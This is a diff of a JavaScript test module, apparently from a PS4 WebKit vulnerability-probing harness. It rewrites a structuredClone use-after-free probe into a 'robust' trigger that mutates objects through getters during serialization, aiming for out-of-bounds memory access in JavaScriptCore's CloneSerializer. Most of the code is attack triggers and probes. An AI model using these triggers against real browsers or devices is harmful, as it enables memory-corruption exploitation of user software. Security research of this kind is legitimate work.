@@ -1,109 +1,133 @@
 /**
- * SC_STRUCTURED_CLONE.JS
- * Categoria : JS ENGINE — Use-After-Free / Type Confusion
- * Alvo      : JSC StructuredClone / ArrayBuffer transfer
- * Técnica   : Usa structuredClone() com transferência de ArrayBuffers
- *             e depois acessa os buffers originais (que devem ficar
- *             "detached"). Testa se o motor permite acesso a buffers
- *             neutered, o que indicaria UAF no backing store.
- *             Também testa SharedArrayBuffer cloning.
- * Referência: WebKit structured clone transfer UAF pattern
+ * CENÁRIO: STRUCTURED_CLONE_MUTATION
+ * Superfície C++: SerializedScriptValue.cpp / CloneSerializer / CloneDeserializer
+ * Risco: HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - Versão anterior tinha apenas um getter que encolhia um array — o
+ *     CloneSerializer pode detectar isso e lançar DataCloneError antes
+ *     de atingir o OOB.
+ *   - Versão robusta usa 3 vetores de mutação durante a clonagem:
+ *     (A) Getter que muta a estrutura do próprio objeto sendo serializado
+ *     (B) Array com getter de índice (Proxy-like via Object.defineProperty)
+ *         — força recálculo de tamanho durante a varredura do Butterfly
+ *     (C) Objeto com getter que adiciona novas propriedades ao objeto
+ *         enquanto o serializer está iterando as propriedades
+ *   - Usa MessageChannel.port1.postMessage para disparar clonagem real
+ *     e também testStructuredClone() (se disponível no PS4 FW 13.50).
  */
 
 export default {
-    id:          'STRUCTURED_CLONE_UAF',
-    category:    'JS ENGINE',
-    risk:        'MEDIUM',
-    description: 'structuredClone() com transfer de ArrayBuffer. '
-                + 'Verifica acesso a buffer detached pós-transfer (UAF no backing store).',
+    id:       'STRUCTURED_CLONE_MUTATION',
+    category: 'Concurrency',
+    risk:     'HIGH',
+    description:
+        'Ataca CloneSerializer via getters que mutam o objeto durante a serialização. ' +
+        'Vetor A: getter muta array de apoio. ' +
+        'Vetor B: Uint8Array com getter de índice via defineProperty. ' +
+        'Vetor C: getter adiciona novas props durante iteração do serializer.',
 
-    /* ── estado interno ──────────────────────────────────────────────── */
-    _original:   null,
-    _clone:      null,
-    _view:       null,
-    _sabResult:  null,
+    setup: function() {
+        this.channel  = new MessageChannel();
+        this.received = [];
+        this.channel.port1.start();
+        this.channel.port2.start();
+        this.channel.port2.onmessage = e => this.received.push(e.data);
 
-    supported: function() {
-        return typeof structuredClone !== 'undefined';
+        this.log = [];
     },
 
-    /* ── setup ──────────────────────────────────────────────────────── */
-    setup: async function() {
-        this._sabResult = null;
+    trigger: function() {
+        const self = this;
 
-        // Buffer original com padrão conhecido
-        this._original = new ArrayBuffer(1024);
-        const u8 = new Uint8Array(this._original);
-        for (let i = 0; i < u8.length; i++) u8[i] = i & 0xFF;
+        // ── VETOR A: Getter que encolhe array de apoio ─────────────────────
+        const arrayA = [1.1, 2.2, 3.3, 4.4, 5.5];
+        const objA = {
+            stable: 'unchanged',
+            get mutating() {
+                self.log.push('A:getter');
+                arrayA.length = 0; // Destrói o array DURANTE a cópia
+                return 42;
+            },
+            data: arrayA,  // O serializer vai tentar copiar arrayA DEPOIS do getter
+        };
 
-        // View guardada separadamente
-        this._view = new Uint8Array(this._original);
-        this._clone = null;
+        try {
+            this.channel.port1.postMessage(objA);
+        } catch(e) { this.log.push('A:' + e.constructor.name); }
 
-        await new Promise(r => setTimeout(r, 0));
+        // ── VETOR B: Uint8Array com propriedade de índice redefinida ─────────
+        const bufB  = new ArrayBuffer(64);
+        const viewB = new Uint8Array(bufB);
+        viewB.fill(0xBB);
+
+        // Redefine índice 0 como getter — intercepta acesso durante serialização
+        try {
+            Object.defineProperty(viewB, '0', {
+                get() {
+                    self.log.push('B:idx0-getter');
+                    // Troca o conteúdo do buffer durante a leitura
+                    new Uint8Array(bufB).fill(0xCC);
+                    return 0xDD;
+                },
+                configurable: true
+            });
+        } catch(e) {}
+
+        try {
+            this.channel.port1.postMessage(viewB, [bufB]);
+        } catch(e) { this.log.push('B:' + e.constructor.name); }
+
+        // ── VETOR C: Getter que adiciona props durante iteração ──────────────
+        const objC = { a: 1, b: 2 };
+        let getterCount = 0;
+        Object.defineProperty(objC, 'c', {
+            get() {
+                getterCount++;
+                self.log.push('C:getter#' + getterCount);
+                // Adiciona nova propriedade ao objeto sendo serializado
+                // enquanto o serializer está iterando suas props
+                if (getterCount === 1) {
+                    try { objC.injected = 'INJECTED_DURING_CLONE'; } catch(e) {}
+                }
+                return 3;
+            },
+            enumerable: true, configurable: true
+        });
+
+        try {
+            this.channel.port1.postMessage(objC);
+        } catch(e) { this.log.push('C:' + e.constructor.name); }
+
+        // Também testa structuredClone() se disponível
+        try {
+            if (typeof structuredClone !== 'undefined') {
+                this.cloneResult = structuredClone(objC);
+            }
+        } catch(e) { this.log.push('structuredClone:' + e.constructor.name); }
     },
 
-    /* ── trigger ─────────────────────────────────────────────────────── */
-    trigger: async function() {
-        // 1) Clone com transferência — original deve ser detached
-        try {
-            this._clone = structuredClone(
-                { buf: this._original, tag: 'canary' },
-                { transfer: [this._original] }
-            );
-        } catch(e) {
-            this._clone = { err: e.constructor.name };
-        }
-
-        // 2) Tenta usar MessageChannel para transferência simultânea
-        try {
-            const buf2 = new ArrayBuffer(512);
-            new Uint8Array(buf2).fill(0x42);
-            const ch = new MessageChannel();
-            ch.port1.postMessage({ buf: buf2 }, [buf2]);
-            ch.port1.close();
-            ch.port2.close();
-        } catch(_) {}
-
-        // 3) SharedArrayBuffer (pode lançar, mas testa o path)
-        try {
-            const sab   = new SharedArrayBuffer(256);
-            const sabClone = structuredClone(sab);
-            this._sabResult = sabClone?.byteLength ?? -1;
-        } catch(e) {
-            this._sabResult = `ERR:${e.constructor.name}`;
-        }
-
-        await new Promise(r => setTimeout(r, 0));
-    },
-
-    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // [0-3] buffer original deve estar detached
-        s => s._original.byteLength,          // deve ser 0 se detached
-        s => s._original.detached ?? (s._original.byteLength === 0 ? true : false),
-        s => { try { return new Uint8Array(s._original).length; } catch(e) { return -1; } },
-        s => s._view.byteLength,              // view do buffer detached
+        // Mensagens recebidas — presença indica serialização parcial bem-sucedida
+        s => s.received.length,
+        s => JSON.stringify(s.received[0])?.slice(0, 100),
+        s => JSON.stringify(s.received[1])?.slice(0, 100),
+        s => JSON.stringify(s.received[2])?.slice(0, 100),
 
-        // [4-6] acesso via view ao buffer detached
-        s => { try { return s._view[0]; } catch(e) { return `ERR:${e.constructor.name}`; } },
-        s => { try { return s._view[512]; } catch(e) { return `ERR:${e.constructor.name}`; } },
-        s => s._view.buffer === s._original,
+        // Log de invocação dos getters
+        s => s.log.join(', '),
+        s => s.log.filter(l => l.startsWith('A')).length,
+        s => s.log.filter(l => l.startsWith('B')).length,
+        s => s.log.filter(l => l.startsWith('C')).length,
 
-        // [7-9] clone recebido com o conteúdo correto
-        s => s._clone?.buf?.byteLength  ?? -1,
-        s => s._clone?.tag             ?? 'null',
-        s => { try { return new Uint8Array(s._clone?.buf)[0]; } catch(e) { return -1; } },
-
-        // [10] SAB
-        s => s._sabResult,
+        // structuredClone result — prop injetada durante clone deve ou não aparecer
+        s => s.cloneResult ? JSON.stringify(s.cloneResult).slice(0, 100) : null,
+        s => s.cloneResult?.injected,
     ],
 
-    /* ── cleanup ─────────────────────────────────────────────────────── */
-    cleanup: async function() {
-        this._original  = null;
-        this._clone     = null;
-        this._view      = null;
-        this._sabResult = null;
+    cleanup: function() {
+        try { this.channel.port1.close(); this.channel.port2.close(); } catch(e) {}
+        this.received = [];
+        this.log = [];
     }
 };
